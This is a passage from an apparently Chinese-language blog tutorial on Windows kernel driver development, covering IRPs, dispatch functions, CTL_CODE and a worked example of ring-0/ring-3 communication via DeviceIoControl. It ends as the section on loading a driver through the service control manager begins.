<p>4、在3环使用符号链接的格式：<code>\\.\符号名称</code>，编程时通常需要使用转义符，写为<code>\\\\.\\符号名称</code>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建符号链接名称</span></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName,<span class="string">L&quot;\\??\\MyTestDriver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建符号链接</span></span><br><span class="line">IoCreateSymbolicLink(&amp;SymbolicLinkName,&amp;Devicename);</span><br></pre></td></tr></table></figure>



<h3 id="1-5-IRP与派遣函数"><a href="#1-5-IRP与派遣函数" class="headerlink" title="1.5 IRP与派遣函数"></a>1.5 IRP与派遣函数</h3><p>Win32程序中，当一个事件发生，操作系统就会将这个事件封装成一个tagMSG结构的消息，然后将该消息发送给产生事件的窗口，然后窗口调用对应的消息回调函数进行处理。</p>
<p>同理，当3环调用API访问设备的时候，在0环会将某API事件封装成IRP结构，然后将IRP发给设备对象，设备对象调用派遣函数（回调函数）来进行处理。</p>
<p><img data-src="https://s2.loli.net/2022/01/17/bAcIVFKrvJOmnB4.png" alt="21.png"></p>
<p><strong>IRP的类型：</strong></p>
<ol>
<li><p>当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数打开、从设备读取数据、向设备写入数据、关闭设备的时候，会使操作系统产生出<code>IRP_MJ_CREATE</code>，<code>IRP_MJ_READ</code>，<code>IRP_MJ_WRITE</code>，<code>IRP_MJ_CLOSE</code>等不同的IRP。</p>
</li>
<li><p>其他类型的IRP。</p>
</li>
</ol>
<p>   <img data-src="https://s2.loli.net/2022/01/17/oUxNpIilGY961aQ.png" alt="22.png"></p>
<p><code>IRP</code>列表如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>调用者</th>
</tr>
</thead>
<tbody><tr>
<td>IRP_MJ_CREATE</td>
<td>请求一个句柄</td>
<td><code>CreateFile</code></td>
</tr>
<tr>
<td>IRP_MJ_CLEANUP</td>
<td>在关闭句柄时取消悬挂的IRP</td>
<td><code>CloseHandle</code></td>
</tr>
<tr>
<td>IRP_MJ_CLOSE</td>
<td>关闭句柄</td>
<td><code>CloseHandle</code></td>
</tr>
<tr>
<td>IRP_MJ_READ</td>
<td>从设备得到数据</td>
<td><code>ReadFile</code></td>
</tr>
<tr>
<td>IRP_MJ_WRITE</td>
<td>传送数据到设备</td>
<td><code>WriteFile</code></td>
</tr>
<tr>
<td>IRP_MJ_DEVICE_CONTROL</td>
<td>控制操作（利用IOCTL宏）</td>
<td><code>DeviceIoControl</code></td>
</tr>
<tr>
<td>RP_MJ_INTERNAL_DEVICE_CONTROL</td>
<td>控制操作(只能被内核调用)</td>
<td><code>N/A</code></td>
</tr>
<tr>
<td>IRP_MJ_QUERY_INFORMATION</td>
<td>得到文件的长度</td>
<td><code>GetFileSize</code></td>
</tr>
<tr>
<td>IRP_MJ_SET_INFORMATION</td>
<td>设置文件的长度</td>
<td><code>SetFileSize</code></td>
</tr>
<tr>
<td>IRP_MJ_FLUSH_BUFFERS</td>
<td>写输出缓冲区或者丢弃输入缓冲区</td>
<td><code>FlushFileBuffers</code></td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>FlushConsoleInputBuffer</code></td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>PurgeComm</code></td>
</tr>
<tr>
<td>IRP_MJ_SHUTDOWN</td>
<td>系统关闭</td>
<td><code>InitiateSystemShutdown</code></td>
</tr>
</tbody></table>
<p>在<code>wdm.h</code>中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE                   0x00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE_NAMED_PIPE        0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CLOSE                    0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_READ                     0x03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_WRITE                    0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_INFORMATION        0x05</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_INFORMATION          0x06</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_EA                 0x07</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_EA                   0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_FLUSH_BUFFERS            0x09</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_VOLUME_INFORMATION   0x0b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DIRECTORY_CONTROL        0x0c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_FILE_SYSTEM_CONTROL      0x0d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SHUTDOWN                 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_LOCK_CONTROL             0x11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CLEANUP                  0x12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_CREATE_MAILSLOT          0x13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_SECURITY           0x14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_SECURITY             0x15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_POWER                    0x16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SYSTEM_CONTROL           0x17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_DEVICE_CHANGE            0x18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_QUERY_QUOTA              0x19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_SET_QUOTA                0x1a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_PNP                      0x1b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_PNP_POWER                IRP_MJ_PNP      <span class="comment">// Obsolete....</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRP_MJ_MAXIMUM_FUNCTION         0x1b</span></span><br></pre></td></tr></table></figure>



<p><strong>派遣函数：</strong></p>
<div class="note success"><p>在Win32中，回调函数需要在窗口处理函数的参数中进行指定。在驱动程序中，<strong>回调函数需要在驱动对象里面进行指定</strong>（派遣）。</p>
<p>一个驱动可以创建许多设备，这些设备的回调函数都放在<strong>驱动对象</strong>的最后一个成员里面（<code>MajorFunction</code>）。<strong>函数是有顺序的</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>IRP_MJ_MAXIMUM_FUNCTION ：派遣函数的最大值</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B	<span class="comment">//2B = 2Byte(SHORT)</span></span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void	<span class="comment">//Ptr32：32位的指针类型</span></span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>

<p><strong>注册派遣函数：</strong>（需要谁就注册谁），<strong>函数是有顺序的</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING reg_path)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//设置派遣函数</span></span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE]	= 派遣函数<span class="number">1</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLOSE]	= 派遣函数<span class="number">2</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE]	= 派遣函数<span class="number">3</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_READ]	= 派遣函数<span class="number">4</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP]= 派遣函数<span class="number">5</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SET_INFORMATION] 	= 派遣函数<span class="number">6</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] 	= 派遣函数<span class="number">7</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SHUTDOWN] 		= 派遣函数<span class="number">8</span>;  </span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_SYSTEM_CONTROL] 	= 派遣函数<span class="number">9</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>派遣函数的格式</strong></p>
<p>Win32的窗口回调函数有自己的格式，同样的派遣函数也有自己的格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">MyDispatchFunction</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="1-6-IRP-MJ-DEVICE-CONTROL交互数据"><a href="#1-6-IRP-MJ-DEVICE-CONTROL交互数据" class="headerlink" title="1.6 IRP_MJ_DEVICE_CONTROL交互数据"></a>1.6 IRP_MJ_DEVICE_CONTROL交互数据</h3><p>应用层调用DeviceControl函数会产生此IRP。<strong>该函数可以与设备双向交互数据</strong>，最常用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是参数2，控制码：<code>dwIoControlCode</code>。32位整数，由一个宏<code>CTL_CODE</code>将4个参数组成一个32位数字。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>FILE_DEVICE_UNKNOWN：设备类型</li>
<li>0x800：自定义代码，0～0x7FF为保留，用户可用0x800～0xFFF</li>
<li>METHOD_BUFFERED：交互方式</li>
<li>FILE_ANY_ACCESS：权限</li>
</ul>
<h3 id="1-7-练习：0环与3环通信"><a href="#1-7-练习：0环与3环通信" class="headerlink" title="1.7 练习：0环与3环通信"></a>1.7 练习：0环与3环通信</h3><p>0环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;ntifs.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\A1v1n_Device_R0&quot;</span>	<span class="comment">//设备名称，0环用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOLICLINK_NAME <span class="meta-string">L&quot;\\??\\A1v1n_Device_R3&quot;</span>	<span class="comment">//符号链接的名称，3环用</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--CreateFile</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--CloseHandle</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceIoControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;<span class="comment">//派遣函数--DeviceIoControl</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">//删除符号连接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName,SYMBOLICLINK_NAME);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	<span class="comment">//删除设备</span></span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT pDriver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS Ntstaus = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>;	<span class="comment">//设备对象</span></span><br><span class="line">	UNICODE_STRING Unicode_Devicename = &#123;<span class="number">0</span>&#125;;<span class="comment">//设备名称</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;Unicode_Devicename,DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建设备对象</span></span><br><span class="line">	Ntstaus = IoCreateDevice(pDriver, <span class="number">0</span> , &amp;Unicode_Devicename, FILE_DEVICE_UNKNOWN, \</span><br><span class="line">                           FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span>(Ntstaus != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备对象失败了.\r\n&quot;</span>);	</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		<span class="keyword">return</span> Ntstaus;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置数据交互方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName,SYMBOLICLINK_NAME);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName,&amp;Unicode_Devicename);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注册派遣函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoControlProc;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备成功.\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//处理自己的业务...</span></span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层设备断开连接.\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;		<span class="comment">//  返回给3环多少数据 没有填0</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceIoControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;	<span class="comment">//用于接收缓冲区的数据</span></span><br><span class="line">	ULONG uIoControlCode = <span class="number">0</span>;		<span class="comment">//控制码</span></span><br><span class="line">	PVOID pIoBuffer = <span class="literal">NULL</span>;		<span class="comment">//缓冲区地址</span></span><br><span class="line">	ULONG uInLength = <span class="number">0</span>;		<span class="comment">//从R3发送过来的数据长度</span></span><br><span class="line">	ULONG uOutLength = <span class="number">0</span>;		<span class="comment">//从R0发给R3的数据长度</span></span><br><span class="line">	ULONG uRead = <span class="number">0</span>;		<span class="comment">//从缓冲区读取的值</span></span><br><span class="line">	ULONG uWrite = <span class="number">0x12345678</span>;	<span class="comment">//写入缓冲区的值</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 从缓冲区获取数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> OPER1:</span><br><span class="line">		&#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER1...\n&quot;</span>);</span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">0</span>;	<span class="comment">// 返回给3环多少数据，没有填0</span></span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> OPER2:</span><br><span class="line">		&#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 接收字节数: %d\n&quot;</span>, uInLength);</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 输出字节数: %d\n&quot;</span>, uOutLength);</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			DbgPrint(<span class="string">&quot;IrpDeviceControlProc -&gt; OPER2 uRead: %x\n&quot;</span>, uRead);</span><br><span class="line">			<span class="comment">// 写入缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">2</span>; <span class="comment">// 返回给3环2字节</span></span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;	<span class="comment">//  getlasterror()得到的就是这个值</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);<span class="comment">//将消息向下处理</span></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOLICLINK_NAME <span class="meta-string">L&quot;\\\\.\\A1v1n_Device_R3&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN_BUFFER_MAXLENGTH 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUT_BUFFER_MAXLENGTH 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="comment">// 获取设备句柄</span></span><br><span class="line">	HANDLE hDevice = CreateFileW(SYMBOLICLINK_NAME,GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	DWORD dwError = GetLastError();</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取设备句柄失败 %d.\n&quot;</span>, dwError); <span class="comment">// 如果返回1，请在驱动中指定 IRP_MJ_CREATE 处理函数</span></span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取设备句柄成功.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 测试通信</span></span><br><span class="line">	DWORD dwInBuffer = <span class="number">0x11111111</span>;</span><br><span class="line">	DWORD dwOutBuffer = <span class="number">0</span>;</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPER2,&amp;dwInBuffer,IN_BUFFER_MAXLENGTH,&amp;dwOutBuffer,OUT_BUFFER_MAXLENGTH,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;dwOutBuffer: %08X dwOut: %08X\n&quot;</span>, dwOutBuffer, dwOut);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/18/6T3ZsKWSqDyvcnX.png" alt="23.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/18/c9WSOqd3kJMptmh.png" alt="24.png"></p>
<h3 id="1-8-练习：在3环实现驱动加载运行"><a href="#1-8-练习：在3环实现驱动加载运行" class="headerlink" title="1.8 练习：在3环实现驱动加载运行"></a>1.8 练习：在3环实现驱动加载运行</h3><p><strong>一、手动加载驱动步骤</strong></p>
<p>用GetFullPathNameW获取驱动的完整路径<br>用OpenSCManager打开服务控制管理器<br>用CreateServiceW创建服务<br>如果服务创建已存在,直接用OpenServiceW打开服务,否则用StartServiceW开启服务<br><strong>二、卸载</strong></p>
<p>用OpenSCManager打开服务控制管理器<br>用OpenServiceA打开服务<br>用ControlService停止驱动服务</p>
<p><strong>⚠️注意：</strong>驱动项目名应和三环中定义的 DRIVER_NAME 一致。<code>MathsDriver.sys</code>程序需要放到3环程序所在目录。</p>
<p>3环代码：</p>
